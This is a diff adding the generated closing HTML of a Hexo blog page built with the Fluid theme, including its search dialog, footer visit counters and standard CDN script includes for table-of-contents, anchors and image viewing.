+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
